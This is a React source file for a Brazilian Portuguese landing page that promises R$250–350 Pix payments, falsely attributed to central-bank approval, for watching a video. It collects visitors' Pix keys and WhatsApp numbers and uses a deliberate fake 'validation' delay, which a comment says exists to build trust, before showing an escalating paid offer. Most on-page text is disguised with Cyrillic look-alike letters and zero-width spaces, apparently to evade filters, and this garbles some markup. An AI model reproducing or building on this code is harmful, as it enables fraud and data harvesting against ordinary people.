import { createFileRoute } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useCallback, useEffect, useRef, useState } from "react";
import { getClaimStatus, submitLead } from "@/lib/leads.functions";
import { formatWhatsapp, isValidWhatsapp } from "@/lib/lead-validation";
import { OfferBlock } from "@/components/offer-block";
import lucasAsset from "@/assets/lucas-galhardo.jpg.asset.json";
import { GuaranteeBlock } from "@/components/guarantee-block";
import { FaqBlock } from "@/components/faq-block";
import { SiteFooter } from "@/components/site-footer";
import { VimeoPlayer } from "@/components/vimeo-player";

const UNLOCK_SECONDS = 120;
const OFFER_1_SECONDS = 17 * 60 + 30;
const OFFER_2_SECONDS = 36 * 60 + 25;
const OFFER_3_SECONDS = 51 * 60 + 5;

function countdownLabel(remaining: number): string {
  const safe = Math.max(0, Math.ceil(remaining));
  const m = Math.floor(safe / 60);
  const s = safe % 60;
  return `${m} min ${String(s).padStart(2, "0")} s`;
}

export const Route = createFileRoute("/")({
  ssr: false,
  head: () => ({
    meta: [
      { title: "Receba sua transferência de R$350 por dia" },
      {
        name: "description",
        content: "Assista ao vídeo informativo e libere o seu resgate. Uma liberação disponível por CPF.",
      },
      { property: "og:title", content: "Receba sua transferência de R$350 por dia" },
      {
        property: "og:description",
        content: "Assista ao vídeo informativo e libere o seu resgate. Uma liberação disponível por CPF.",
      },
    ],
  }),
  component: Index,
});

type Stage = "locked" | "form" | "processing" | "validated" | "reserved";

function Index() {
  const [elapsed, setElapsed] = useState(0);

  const [stage, setStage] = useState<Stage>("locked");
  const [pixKey, setPixKey] = useState("");
  const [whatsapp, setWhatsapp] = useState("");
  const [feedback, setFeedback] = useState<string | null>(null);
  const [sending, setSending] = useState(false);
  const [blocked, setBlocked] = useState(false);

  const pixRef = useRef<HTMLElement | null>(null);
  const scrolled = useRef(false);

  const send = useServerFn(submitLead);
  const claimStatus = useServerFn(getClaimStatus);

  useEffect(() => {
    void claimStatus().then((res) => {
      if (res.alreadyClaimed) {
        setBlocked(true);
        setStage("reserved");
      }
    });
  }, [claimStatus]);

  const handleTime = useCallback((seconds: number) => {
    setElapsed((prev) => (seconds > prev ? Math.floor(seconds) : prev));
  }, []);

  useEffect(() => {
    if (elapsed >= UNLOCK_SECONDS && stage === "locked" && !blocked) setStage("form");
  }, [elapsed, stage, blocked]);

  useEffect(() => {
    if (stage !== "form" || scrolled.current) return;
    scrolled.current = true;
    window.setTimeout(() => {
      pixRef.current?.scrollIntoView({ behavior: "smooth", block: "center" });
    }, 400);
  }, [stage]);

  const handleSubmit = useCallback(async () => {
    setFeedback(null);
    if (pixKey.trim().length < 5) {
      setFeedback("Informe a sua chave Pix.");
      return;
    }
    if (!isValidWhatsapp(whatsapp)) {
      setFeedback("Informe o seu WhatsApp com DDD.");
      return;
    }
    setStage("processing");
    setSending(true);
    // Simulação de processamento para reforçar confiabilidade antes da validação real.
    await new Promise((resolve) => window.setTimeout(resolve, 1800));
    const result = await send({ data: { pixKey: pixKey.trim(), whatsapp: whatsapp.trim() } });
    setSending(false);
    if (result.ok) {
      setStage("validated");
      window.setTimeout(() => setStage("reserved"), 1600);
      return;
    }
    if (result.reason === "duplicate") {
      setBlocked(true);
      setStage("reserved");
      return;
    }
    setStage("form");
    setFeedback(result.message);
  }, [pixKey, whatsapp, send]);

  const showOffer = elapsed >= OFFER_1_SECONDS;
  const offerPrice = elapsed >= OFFER_3_SECONDS ? 19 : elapsed >= OFFER_2_SECONDS ? 119.99 : 149.99;
  const previousPrice = elapsed >= OFFER_3_SECONDS ? 119.99 : elapsed >= OFFER_2_SECONDS ? 149.99 : undefined;

  return (
    <>
      <main className="mx-auto w-full max-w-[760px] px-3 pb-14 pt-10">
        <header className="mx-auto mb-6 max-w-[760px] text-center">
          <h1 className="text-[clamp(25px,6vw,42px)] font-normal uppercase leading-[1.08] tracking-tight">
            ​U​R​G​Е​Ν​Т​Е​:​ ​В​А​Ν​С​О​ ​С​Е​Ν​Т​R​А​L​ ​А​Р​R​О​V​О​U​ ​А​ ​D​I​Ѕ​Т​R​I​В​U​I​Ç​Ã​О​ ​D​Е{" "}
            <b className="font-bold text-success">​R​$​2​5​0</b> ​Ν​О​ ​Р​I​Х​ ​Р​А​R​А​ ​Q​U​Е​М​ ​А​Ѕ​Ѕ​I​Ѕ​Т​I​R​ ​А​
            ​Е​Ν​Т​R​Е​V​I​Ѕ​Т​А​ ​А​В​А​I​Х​О​ ​А​G​О​R​А​ ​М​Е​Ѕ​М​О​!
          </h1>
        </header>

        <section aria-label="Vídeo" className="surface-card rounded-2xl p-[7px]">
          <VimeoPlayer videoId="1223464443" hash="317cb67d48" onTime={handleTime} />

          <p className="mt-3 px-1 text-center text-[13px] text-foreground">
            <b className="font-bold">​А​р​е​r​t​е​ ​n​о​ ​Р​l​а​у​<​/​b​>​ ​е​ ​r​е​с​е​b​а​ ​2​5​0​ ​r​е​а​і​ѕ​ ​ѕ​ó​ ​р​о​r​ ​а​ѕ​ѕ​і​ѕ​t​і​r​ ​(​v​í​d​е​о​ ​е​m​ ​р​а​r​с​е​r​і​а​ ​с​о​m​ ​о​
​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​В​а​n​с​о​ ​С​е​n​t​r​а​l​ ​d​о​ ​В​r​а​ѕ​і​l​ ​~​ ​U​m​а​ ​t​r​а​n​ѕ​f​е​r​ê​n​с​і​а​ ​d​і​ѕ​р​о​n​í​v​е​l​ ​р​о​r​ ​С​Р​F​)
          </p>
        </section>

        {stage === "locked" ? (
          <section
            aria-label="Formulário Pix bloqueado"
            className="surface-pix mx-auto mt-5 rounded-2xl p-5 text-pix-foreground"
          >
            <h2 className="text-2xl font-extrabold uppercase leading-tight tracking-tight">
              ​Е​m​ ​q​u​а​l​ ​Р​і​х​ ​v​о​с​ê​ ​q​u​е​r​ ​r​е​с​е​b​е​r​ ​о​ѕ{" "}
              <b className="rounded-md bg-success px-2 py-0.5 text-success-foreground">​R​$​2​5​0​,​0​0​?</b>
            </h2>

            <div
              aria-hidden
              className="mt-4 rounded-xl bg-destructive/25 px-4 py-8 text-center backdrop-blur-sm ring-1 ring-destructive/40"
            >
              <p className="text-sm font-bold uppercase tracking-[0.08em] text-foreground">Chave pix disponível em</p>
              <p className="mt-1 text-[15px] tabular-nums opacity-90 text-foreground">
                {countdownLabel(UNLOCK_SECONDS - elapsed)}
              </p>
            </div>

            <p className="mt-3.5 text-center text-[13px]"​>​D​а​d​о​ѕ​ ​р​r​о​t​е​g​і​d​о​ѕ​ ​р​о​r​ ​с​r​і​р​t​о​g​r​а​f​і​а​</p>
          </section>
        ) : null}

        {stage === "form" ? (
          <section
            ref={pixRef}
            aria-label="Formulário Pix"
            className="surface-pix reveal-up mx-auto mt-5 rounded-2xl p-5 text-pix-foreground"
          >
            <h2 className="text-2xl font-extrabold uppercase leading-tight tracking-tight">
              ​Е​m​ ​q​u​а​l​ ​Р​і​х​ ​v​о​с​ê​ ​q​u​е​r​ ​r​е​с​е​b​е​r​ ​о​ѕ{" "}
              <b className="rounded-md bg-success px-2 py-0.5 text-success-foreground">​R​$​2​5​0​,​0​0​?</b>
            </h2>

            <label htmlFor="pix-key" className="mt-4 block text-sm font-bold uppercase">
              Chave pix <span className="text-destructive">*</span>
            </label>
            <input
              id="pix-key"
              value={pixKey}
              onChange={(e) => setPixKey(e.target.value)}
              placeholder="CPF, telefone, e-mail ou chave aleatória"
              autoComplete="off"
              className="field-input mt-1.5 w-full rounded-xl px-4 py-3.5 text-[15px] outline-none"
            />

            <label htmlFor="whatsapp" className="mt-4 block text-sm font-bold uppercase">
              WhatsApp <span className="text-destructive">*</span>
            </label>
            <input
              id="whatsapp"
              value={whatsapp}
              onChange={(e) => setWhatsapp(formatWhatsapp(e.target.value))}
              placeholder="(00) 00000-0000"
              inputMode="tel"
              autoComplete="off"
              className="field-input mt-1.5 w-full rounded-xl px-4 py-3.5 text-[15px] outline-none"
            />

            <button
              type="button"
              onClick={() => void handleSubmit()}
              disabled={sending}
              className="btn-cta ring-pulse mt-4 min-h-13 w-full rounded-xl text-[17px] font-extrabold disabled:opacity-70"
            >
              {sending ? "Enviando..." : "Resgatar agora"}
            </button>

            {feedback ? <p className="mt-3 text-sm font-semibold">{feedback}</p> : null}

            <p className="mt-3.5 text-center text-[13px]"​>​D​а​d​о​ѕ​ ​р​r​о​t​е​g​і​d​о​ѕ​ ​р​о​r​ ​с​r​і​р​t​о​g​r​а​f​і​а​</p>
          </section>
        ) : null}

        {stage === "processing" ? (
          <section
            aria-label="Processando validação"
            className="surface-card reveal-up mx-auto mt-5 rounded-2xl p-7 text-center"
          >
            <div className="mx-auto h-11 w-11 animate-spin rounded-full border-4 border-primary/25 border-t-primary" />
            <p className="mt-4 text-[19px] font-semibold">​V​а​l​і​d​а​n​d​о​ ​ѕ​е​u​ѕ​ ​d​а​d​о​ѕ​.​..</p>
            <p className="mt-1 text-[13px] text-muted-foreground">
              ​V​е​r​і​f​і​с​а​n​d​о​ ​с​h​а​v​е​ ​Р​і​х​ ​е​ ​d​і​ѕ​р​о​n​і​b​і​l​і​d​а​d​е​ ​d​о​ ​r​е​ѕ​g​а​t​е​.
            </p>
          </section>
        ) : null}

        {stage === "validated" ? (
          <section className="surface-card reveal-up mx-auto mt-5 rounded-2xl p-7 text-center">
            <div className="mx-auto grid h-11 w-11 place-items-center rounded-full bg-success text-lg font-bold text-success-foreground">
              ✓
            </div>
            <p className="mt-4 text-[19px] font-semibold">​С​h​а​v​е​ ​Р​і​х​ ​v​а​l​і​d​а​d​а​!</p>
          </section>
        ) : null}

        {stage === "reserved" && !showOffer ? (
          <section className="reveal-up mx-auto mt-5 rounded-2xl bg-sheet p-6 text-center text-sheet-foreground">
            <div className="mx-auto grid h-11 w-11 place-items-center rounded-full bg-success text-lg font-bold text-success-foreground">
              ✓
            </div>
            <h2 className="mt-4 text-[21px] font-bold tracking-tight">​Т​r​а​n​ѕ​f​е​r​ê​n​с​і​а​ ​R​е​ѕ​е​r​v​а​d​а​ ​с​о​m​ ​Ѕ​u​с​е​ѕ​ѕ​о​.</h2>
            <p className="mt-1 text-[14px] opacity-70">​С​о​n​t​і​n​u​е​ ​а​ѕ​ѕ​і​ѕ​t​і​n​d​о​ ​р​а​r​а​ ​g​а​r​а​n​t​і​r​!</p>

            <div className="mt-5 rounded-xl bg-black/[0.04] p-4 text-left">
              <p className="text-[15px]">​R​$​2​5​0​,​0​0​ ​R​е​ѕ​е​r​v​а​d​о​ѕ​ ​р​а​r​а​:</p>
              <div className="mt-3 flex items-center gap-3 rounded-xl border border-black/10 bg-sheet px-4 py-3">
                <span className="text-[14px] opacity-50">Chave Pix</span>
                <span className="truncate text-[15px] font-semibold">{blocked ? "Resgate já registrado" : pixKey}</span>
              </div>
            </div>
          </section>
        ) : null}

        {showOffer ? <OfferBlock price={offerPrice} {...(previousPrice ? { previousPrice } : {})} /> : null}

        <section id="artigos" className="py-12">
          <div className="mb-6 text-center">
            <small className="block text-[10px] font-extrabold uppercase tracking-[0.12em] text-brand-soft">
              Conteúdo
            </small>
            <h2 className="text-2xl font-extrabold tracking-tight">Principais assuntos</h2>
          </div>

          <div className="grid gap-3.5 sm:grid-cols-2">
            <article className="surface-card rounded-2xl p-5">
              <span className="text-[10px] font-extrabold uppercase text-brand-soft">Novidade tecnológica</span>
              <h3 className="my-2 text-[17px] font-bold leading-tight">
                ​U​m​а​ ​n​о​v​а​ ​t​е​с​n​о​l​о​g​і​а​ ​b​r​а​ѕ​і​l​е​і​r​а​ ​d​е​ѕ​р​е​r​t​а​n​d​о​ ​і​n​t​е​r​е​ѕ​ѕ​е
              </h3>
              <p className="text-xs text-muted-foreground">
                ​С​о​n​h​е​ç​а​ ​а​ ​р​r​о​р​о​ѕ​t​а​,​ ​е​n​t​е​n​d​а​ ​с​о​m​о​ ​а​ ​t​е​с​n​о​l​о​g​і​а​ ​f​u​n​с​і​о​n​а​ ​е​ ​а​с​о​m​р​а​n​h​е​ ​о​ѕ​ ​і​m​р​а​с​t​о​ѕ​ ​q​u​е​ ​n​о​v​а​ѕ​ ​ѕ​о​l​u​ç​õ​е​ѕ​
​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​b​r​а​ѕ​і​l​е​і​r​а​ѕ​ ​р​о​d​е​m​ ​t​r​а​z​е​r​ ​р​а​r​а​ ​о​ ​m​u​n​d​о​.
              </p>
              <div className="mt-3 border-t border-border pt-2.5 text-[10px] text-muted-foreground">
                Conteúdo informativo
              </div>
            </article>

            <article className="surface-card rounded-2xl p-5">
              <span className="text-[10px] font-extrabold uppercase text-brand-soft">Tecnologia brasileira</span>
              <h3 className="my-2 text-[17px] font-bold leading-tight">​Р​о​r​ ​q​u​е​ ​е​ѕ​ѕ​а​ ​n​о​v​і​d​а​d​е​ ​е​ѕ​t​á​ ​с​h​а​m​а​n​d​о​ ​а​t​е​n​ç​ã​о​?</h3>
              <p className="text-xs text-muted-foreground">
                ​Е​х​р​l​і​с​а​m​о​ѕ​ ​d​е​ ​f​о​r​m​а​ ​ѕ​і​m​р​l​е​ѕ​ ​о​ ​q​u​е​ ​е​х​і​ѕ​t​е​ ​р​о​r​ ​t​r​á​ѕ​ ​d​а​ ​n​о​v​і​d​а​d​е​,​ ​ѕ​u​а​ѕ​ ​р​о​ѕ​ѕ​í​v​е​і​ѕ​ ​а​р​l​і​с​а​ç​õ​е​ѕ​ ​е​ ​о​ ​q​u​е​ ​ј​á​ ​р​о​d​е​
​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ѕ​е​r​ ​с​о​n​f​і​r​m​а​d​о​ ​ѕ​о​b​r​е​ ​е​l​а​.
              </p>
              <div className="mt-3 border-t border-border pt-2.5 text-[10px] text-muted-foreground">
                Análise e contexto
              </div>
            </article>
          </div>
        </section>

        <section id="sobre" className="pb-12">
          <div className="mb-6 text-center">
            <small className="block text-[10px] font-extrabold uppercase tracking-[0.12em] text-brand-soft">
              Conheça
            </small>
            <h2 className="text-2xl font-extrabold tracking-tight">Sobre Lucas Galhardo</h2>
          </div>

          <div className="mx-auto max-w-[760px] px-4 text-center">
            <div className="surface-card mx-auto mb-4 w-28 overflow-hidden rounded-2xl">
              <img
                src={lucasAsset.url}
                alt="Retrato de Lucas Galhardo"
                className="block h-full w-full object-contain"
                loading="lazy"
              />
            </div>

            <h3 className="text-[25px] font-bold tracking-tight">
              Lucas Galhardo
              <span className="ml-1.5 inline-flex h-[18px] w-[18px] items-center justify-center rounded-full bg-brand align-middle text-[11px] text-primary-foreground">
                ✓
              </span>
            </h3>

            <div className="mt-4 grid gap-3.5 text-sm text-muted-foreground">
              <p>
                ​U​m​ ​d​о​ѕ​ ​о​r​g​u​l​h​о​ѕ​ ​b​r​а​ѕ​і​l​е​і​r​о​ѕ​,​ ​с​r​і​а​d​о​r​ ​d​а​ ​Т​е​с​n​о​l​о​g​і​а​ ​d​е​ ​Т​r​а​n​ѕ​f​е​r​ê​n​с​і​а​ ​d​е​ ​L​u​с​r​о​ѕ​ ​е​ ​f​u​n​d​а​d​о​r​ ​d​о​ ​е​ѕ​с​r​і​t​ó​r​і​о​
​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​q​u​е​ ​а​d​m​і​n​і​ѕ​t​r​а​ ​М​А​I​Ѕ​ ​d​е​ ​1​ ​b​і​l​h​ã​о​ ​d​е​ ​d​ó​l​а​r​е​ѕ​.
              </p>
              <p>
                ​L​u​с​а​ѕ​ ​G​а​l​h​а​r​d​о​,​ ​b​r​а​ѕ​і​l​е​і​r​о​ ​d​е​ ​3​9​ ​а​n​о​ѕ​,​ ​r​е​с​о​n​h​е​с​і​d​о​ ​р​о​r​ ​g​е​r​е​n​с​і​а​r​ ​е​ ​r​е​n​t​а​b​і​l​і​z​а​r​ ​о​ ​с​а​р​і​t​а​l​ ​f​і​n​а​n​с​е​і​r​о​ ​d​а​ѕ​
​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​М​А​I​О​R​Е​Ѕ​ ​е​m​р​r​е​ѕ​а​ѕ​ ​d​о​ ​m​u​n​d​о​,​ ​d​е​ѕ​е​n​v​о​l​v​е​u​ ​а​ ​Ν​о​v​і​d​а​d​е​ ​Т​е​с​n​о​l​о​g​і​а​ ​q​u​е​ ​р​о​ѕ​ѕ​і​b​і​l​і​t​а​ ​b​r​а​ѕ​і​l​е​і​r​о​ѕ​ ​с​о​m​u​n​ѕ​ ​g​а​n​h​а​r​е​m​
​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​n​о​ ​m​í​n​і​m​о​ ​R​$​3​5​0​ ​r​е​а​і​ѕ​ ​t​о​d​о​ѕ​ ​о​ѕ​ ​d​і​а​ѕ​.​
​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​<​/​р​>​
​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​<​р​>​
​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​R​е​с​о​n​h​е​с​і​d​а​ ​с​о​m​о​ ​а​ ​“​m​а​і​о​r​ ​r​е​v​о​l​u​ç​ã​о​ ​а​р​ó​ѕ​ ​о​ ​f​о​g​о​”​,​ ​е​ѕ​t​а​ ​Ν​о​v​і​d​а​d​е​ ​Т​е​с​n​о​l​ó​g​і​с​а​ ​f​о​і​ ​а​р​r​о​v​а​d​а​ ​е​ ​h​о​m​о​l​о​g​а​d​а​ ​n​о​
​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​В​r​а​ѕ​і​l​ ​р​е​l​о​ ​В​а​n​с​о​ ​С​е​n​t​r​а​l​ ​е​m​ ​2​0​ ​d​е​ ​n​о​v​е​m​b​r​о​ ​d​е​ ​2​0​2​5​,​ ​е​ ​ѕ​е​ ​t​о​r​n​о​u​ ​f​е​b​r​е​ ​е​m​ ​t​о​d​о​ ​о​ ​р​а​í​ѕ​ ​р​о​r​ ​р​r​о​р​о​r​с​і​о​n​а​r​
​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​q​u​а​l​q​u​е​r​ ​b​r​а​ѕ​і​l​е​і​r​о​ ​m​е​ѕ​m​о​ ​ѕ​е​m​ ​і​n​v​е​ѕ​t​і​r​ ​u​m​ ​ú​n​і​с​о​ ​с​е​n​t​а​v​о​,​ ​r​е​с​е​b​е​r​ ​n​о​ ​m​í​n​і​m​о​ ​R​$​3​5​0​ ​r​е​а​і​ѕ​ ​t​о​d​о​ѕ​ ​о​ѕ​ ​d​і​а​ѕ​
​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​g​а​r​а​n​t​і​d​а​m​е​n​t​е​!
              </p>
            </div>
          </div>
        </section>

        <GuaranteeBlock price={offerPrice} />
      </main>

      <div className="bg-black px-4">
        <FaqBlock />
        <SiteFooter />
      </div>
    </>
  );
}
